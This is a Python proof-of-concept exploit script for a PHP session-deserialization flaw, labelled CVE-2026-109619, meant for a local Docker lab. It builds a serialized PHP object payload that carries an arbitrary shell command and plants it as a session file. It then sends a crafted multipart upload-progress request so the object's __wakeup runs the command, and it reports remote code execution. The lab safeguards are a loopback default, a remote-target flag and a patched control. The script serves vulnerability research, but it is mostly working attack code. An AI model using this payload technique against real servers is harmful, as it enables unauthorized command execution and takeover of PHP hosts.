#!/usr/bin/env python3
"""Pre-RINIT session-deserialization -> __wakeup RCE.

Ported from mazdel/php2shell-poc. With upload_progress on, the session decode
runs before the script RINIT, so a serialized object sitting in sess_<id> is
unserialized and its __wakeup fires even for endpoints that never call
session_start(). Offset-free, ASLR-free object-injection route (not a
memory-corruption exploit).

Gated on: unpatched PHP; serialize_handler=php; a pre-RINIT-reachable gadget
class (the lab preloads one); and a session-seed primitive (the lab plants the
record locally -- this PoC provides no remote seeding channel).

Usage (local Docker lab):
  docker compose -f docker-compose.apps.yml -p p2s-preloadrinit --profile preloadrinit up -d
  python3 poc/routes/preload_rinit.py -c 'id; whoami'
  python3 poc/routes/preload_rinit.py --fixed            # negative control
"""
from __future__ import annotations

import argparse
import http.client
import re
import secrets
import shlex
import subprocess
import sys
import time
import urllib.parse

CLASS = "PreloadRceProbe"
SESSION_KEY = "evil"
SESSION_PROPERTY = "cmd"
MARKER = "/tmp/preload_rinit_rce.txt"
BODY_BEGIN = b"PRELOAD-RINIT-BEGIN"
BODY_END = b"PRELOAD-RINIT-END"
DEFAULT_URL = "http://127.0.0.1:8911/"
FIXED_URL = "http://127.0.0.1:8912/"
DEFAULT_CONTAINER = "php2shell-preloadrinit-php"
FIXED_CONTAINER = "php2shell-preloadrinit-php-fixed"
DEFAULT_SESSION_DIR = "/tmp"
DEFAULT_COMMAND = "id; whoami; hostname; uname -a"
MAX_BODY = 2_000_000
LOOPBACK = {"127.0.0.1", "localhost", "::1"}


class RequestError(RuntimeError):
    pass


def docker_exec(container: str, script: str, data: bytes | None = None, check: bool = True):
    return subprocess.run(
        ["docker", "exec", "-i", container, "sh", "-c", script],
        input=data, capture_output=True, check=check,
    )


def validate_sid(sid: str) -> str:
    if not re.fullmatch(r"[A-Za-z0-9,-]{8,128}", sid or ""):
        raise SystemExit("session id must be 8-128 chars from [A-Za-z0-9,-]")
    return sid


def make_record(command: str) -> bytes:
    cls = CLASS.encode()
    prop = SESSION_PROPERTY.encode()
    raw = command.encode()
    obj = (
        f'O:{len(cls)}:"{CLASS}":1:{{s:{len(prop)}:"{SESSION_PROPERTY}";'
        f's:{len(raw)}:"{command}";}}'
    )
    return f"{SESSION_KEY}|{obj}".encode()


def build_multipart(sid: str) -> tuple[str, bytes]:
    boundary = "----preloadrinit" + secrets.token_hex(12)
    chunks: list[bytes] = []

    def field(name: str, value: str) -> None:
        chunks.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
        )

    field("PHPSESSID", sid)
    field("PHP_SESSION_UPLOAD_PROGRESS", "x")
    chunks.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n".encode()
        + b"A" * 4096 + b"\r\n"
    )
    chunks.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(chunks)


def send(url: str, sid: str, timeout: float) -> tuple[int, str, bytes]:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise RequestError("--url must be an http(s) URL")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    boundary, body = build_multipart(sid)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "Cookie": f"PHPSESSID={sid}",
        "Connection": "close",
    }
    conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.reason, resp.read(MAX_BODY)
    except Exception as exc:
        raise RequestError(f"POST {url}: {exc}") from exc
    finally:
        conn.close()


def framed_output(body: bytes) -> bytes | None:
    i = body.find(BODY_BEGIN)
    if i < 0:
        return None
    start = i + len(BODY_BEGIN)
    end = body.find(BODY_END, start)
    if end < 0:
        return None
    return body[start:end].strip()


def plant_session(container: str, session_dir: str, sid: str, record: bytes) -> str:
    path = f"{session_dir}/sess_{sid}"
    script = (
        f"umask 007 && cat > {shlex.quote(path)} && "
        f"chown www-data:www-data {shlex.quote(path)}"
    )
    docker_exec(container, script, data=record)   # local write = lab-only seed channel
    return path


def read_marker(container: str) -> bytes:
    r = docker_exec(container, f"cat {shlex.quote(MARKER)}", check=False)
    return r.stdout if r.returncode == 0 else b""


def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-109619 pre-RINIT __wakeup PoC (authorized labs only)")
    ap.add_argument("-u", "--url", help=f"target endpoint (default: {DEFAULT_URL}, or {FIXED_URL} with --fixed)")
    ap.add_argument("-c", "--command", default=DEFAULT_COMMAND, help="command executed by the gadget")
    ap.add_argument("--container", help="PHP container for seeding and marker reads")
    ap.add_argument("--session-dir", default=DEFAULT_SESSION_DIR, help="session.save_path inside the container")
    ap.add_argument("--sid", default="", help="session id (random by default)")
    ap.add_argument("--fixed", action="store_true", help="target the patched 8.4.27 negative control")
    ap.add_argument("--no-seed", action="store_true", help="do not seed; send to an already-seeded session")
    ap.add_argument("--allow-remote", action="store_true", help="permit a non-loopback target")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    url = args.url or (FIXED_URL if args.fixed else DEFAULT_URL)
    container = args.container or (FIXED_CONTAINER if args.fixed else DEFAULT_CONTAINER)
    host = (urllib.parse.urlparse(url).hostname or "").lower()
    if host not in LOOPBACK and not args.allow_remote:
        raise SystemExit("refusing non-loopback target; pass --allow-remote with authorization")

    sid = validate_sid(args.sid) if args.sid else secrets.token_hex(12)
    record = make_record(args.command)
    session_path = f"{args.session_dir}/sess_{sid}"

    print(f"[*] target      {url}")
    print(f"[*] session     {sid}")
    print(f"[*] record      {record.decode(errors='replace')}")
    if not args.no_seed:
        docker_exec(container, f"rm -f {shlex.quote(MARKER)}", check=False)
        plant_session(container, args.session_dir, sid, record)
        print(f"[*] seeded      {session_path} (lab-only local write)")
    else:
        print(f"[*] seed        skipped (--no-seed); expecting {session_path}")

    try:
        status, reason, body = send(url, sid, args.timeout)
        print(f"[*] response    HTTP {status} {reason}")
    except RequestError as exc:
        print(f"[!] request failed: {exc}")
        return 1

    time.sleep(0.2)
    proof = read_marker(container) if not args.no_seed else b""
    output = framed_output(body)

    if proof or output is not None:
        print("[+] RCE CONFIRMED: __wakeup() executed before RINIT")
        text = (proof or output or b"").decode(errors="replace").rstrip()
        for line in text.splitlines():
            print("    " + line)
        return 0

    print("[x] NOT CONFIRMED: no marker and no framed output "
          "(expected on the patched --fixed control)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
